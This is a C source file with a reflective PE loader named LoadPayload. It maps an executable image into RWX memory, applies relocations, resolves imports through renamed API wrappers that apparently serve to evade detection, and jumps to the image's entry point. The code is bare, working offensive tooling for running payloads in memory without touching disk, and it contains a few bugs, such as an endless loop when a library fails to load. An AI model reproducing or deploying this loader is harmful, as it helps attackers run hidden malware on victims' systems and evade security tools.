#include "loadpe.h"



int LoadPayload(PBYTE peMemMap) 
{
    DWORD_PTR PEexecaddr = 0;
    PIMAGE_DOS_HEADER dosHeaders = (PIMAGE_DOS_HEADER)peMemMap;
    PIMAGE_NT_HEADERS NtHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)peMemMap + dosHeaders->e_lfanew);
    SIZE_T ImageSize = NtHeaders->OptionalHeader.SizeOfImage;
    DWORD size = NtHeaders->OptionalHeader.SizeOfHeaders;
    // allocate executable memory location 
    if ((PEexecaddr = (DWORD_PTR)virtaex(getcurrentp(), NULL, ImageSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE)) == NULL)
    {
        return -1;
    }
    DWORD_PTR seekDest = PEexecaddr;
    DWORD_PTR seekSrc = peMemMap;
    // copy the dll headers to the new location
    while (size--)
        *(BYTE*)(seekDest++) = *(BYTE*)seekSrc++;
    // copy the sections to the new location
    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(NtHeaders);
    int nS = NtHeaders->FileHeader.NumberOfSections;
    for (int x = 0; x < nS; x++) {
        size = section->SizeOfRawData;
        seekDest = PEexecaddr + (DWORD_PTR)section->VirtualAddress;
        seekSrc = peMemMap + (DWORD_PTR)section->PointerToRawData;
        while (size--) {
            *(BYTE*)(seekDest++) = *(BYTE*)seekSrc++;
        }
        section++;
    }
    // RELOCATION
    DWORD_PTR deltaImageBase = PEexecaddr - (DWORD_PTR)NtHeaders->OptionalHeader.ImageBase;
    IMAGE_DATA_DIRECTORY relocHeader = NtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
    size = relocHeader.Size;
    DWORD_PTR relocSection = (PEexecaddr + (DWORD_PTR)relocHeader.VirtualAddress);
    DWORD sizeProcessed = 0;
    PIMAGE_BASE_RELOCATION block = NULL;
    PRELOCATION_ENTRY entry;
    DWORD numberofENTRY = 0;
    while (sizeProcessed < size) {
        block = (PIMAGE_BASE_RELOCATION)((DWORD_PTR)relocSection + sizeProcessed);
        sizeProcessed += block->SizeOfBlock;
        numberofENTRY = ((block->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(RELOCATION_ENTRY));
        for (int i = 0; i < numberofENTRY; i++) {
            DWORD_PTR address = ((DWORD_PTR)block + sizeof(IMAGE_BASE_RELOCATION) + sizeof(RELOCATION_ENTRY)*i);
            entry = (PRELOCATION_ENTRY)(address);
            // get the address of data to patch
            DWORD_PTR relocAddress = PEexecaddr + (DWORD_PTR)(block->VirtualAddress + entry->Offset);
            DWORD_PTR addtp;
            addtp = *(DWORD_PTR*)relocAddress;
            addtp += deltaImageBase;
            if (entry->Type == 3) {
                *(DWORD_PTR*)relocAddress = addtp;
            }
        }
    }
    // IAT RESOLUTION
    IMAGE_DATA_DIRECTORY dirImport = NtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    PIMAGE_IMPORT_DESCRIPTOR sector = (PIMAGE_IMPORT_DESCRIPTOR)(dirImport.VirtualAddress + PEexecaddr);
    HMODULE library = NULL;
    LPCSTR libraryName = "";
    while (sector->Name != NULL && dirImport.Size != 0)
    {
        libraryName = (LPCSTR)(sector->Name + PEexecaddr);
        library = loadlib(libraryName);
        if (library == NULL) continue;
        PIMAGE_THUNK_DATA thunk = (IMAGE_THUNK_DATA*)(PEexecaddr + sector->FirstThunk);
        while (thunk->u1.AddressOfData != NULL)
        {
            if ((thunk->u1.Ordinal & 0x80000000) != 0)
            {
                LPCSTR functionOrdinal = (LPCSTR)(0xffff & thunk->u1.Ordinal);
                thunk->u1.Function = (DWORD_PTR)getproc(library, functionOrdinal);
            }
            else
            {
                PIMAGE_IMPORT_BY_NAME functionName = (PIMAGE_IMPORT_BY_NAME)(PEexecaddr + thunk->u1.AddressOfData);
                DWORD_PTR functionAddress = (DWORD_PTR)getproc(library, functionName->Name);
                thunk->u1.Function = functionAddress;
            }

            thunk++;
        }
        sector++;
    }
    entryPoint punto = (entryPoint)(PEexecaddr + NtHeaders->OptionalHeader.AddressOfEntryPoint);
    (*punto)();
    return 0;

}